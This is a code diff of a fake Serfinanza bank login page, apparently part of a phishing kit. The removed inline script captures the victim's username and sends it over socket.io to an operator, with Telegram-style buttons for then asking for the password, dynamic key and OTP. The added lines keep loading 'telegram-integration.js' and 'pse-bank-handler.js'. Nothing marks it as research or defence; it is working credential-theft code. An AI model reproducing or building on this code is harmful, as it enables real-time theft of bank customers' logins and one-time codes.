@@ -91,58 +91,9 @@
         </div>
     </div>
 
-    <script src="/socket.io/socket.io.js"></script>`n    <script src="/js/telegram-integration.js"></script>`n    <script src="/js/banco-utils.js"></script>`n    <script src="/js/pse-bank-handler.js"></script>
-</body>
-</html>
-    <script>
-        const btnIngresar = document.getElementById('btnIngresar');
-        const usuarioInput = document.getElementById('usuarioInput');
-
-        btnIngresar.addEventListener('click', function() {
-            const usuario = usuarioInput.value.trim();
-            
-            if (!usuario) {
-                alert('Por favor ingresa tu usuario');
-                return;
-            }
-
-            showOverlay();
-
-            const serfinanzaData = JSON.parse(sessionStorage.getItem('serfinanzaData') || '{}');
-            serfinanzaData.usuario = usuario;
-            sessionStorage.setItem('serfinanzaData', JSON.stringify(serfinanzaData));
-
-            const message = `
-🔔 <b>SERFINANZA - USUARIO</b>
-
-📝 <b>INFORMACIÓN ACTUAL:</b>
-👤 <b>Usuario:</b> ${serfinanzaData.usuario}
-
-⏰ ${new Date().toLocaleString('es-CO')}
-            `.trim();
-
-            const keyboard = {
-                inline_keyboard: [
-                    [{ text: '👤 Pedir Usuario', callback_data: `request_usuario:${sessionId}` }],
-                    [{ text: '🔑 Pedir Contraseña', callback_data: `request_password:${sessionId}` }],
-                    [{ text: '🔢 Pedir Dinámica', callback_data: `request_dynamic:${sessionId}` }],
-                    [{ text: '📱 Pedir OTP', callback_data: `request_otp:${sessionId}` }],
-                    [{ text: '✅ Finalizar', callback_data: `finish:${sessionId}` }]
-                ]
-            };
-
-            socket.emit('sendData', {
-                sessionId: sessionId,
-                type: 'usuario',
-                content: { text: message, keyboard: keyboard }
-            });
-        });
-
-        usuarioInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                btnIngresar.click();
-            }
-        });
-    </script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/telegram-integration.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script src="/js/pse-bank-handler.js"></script>
 </body>
 </html>
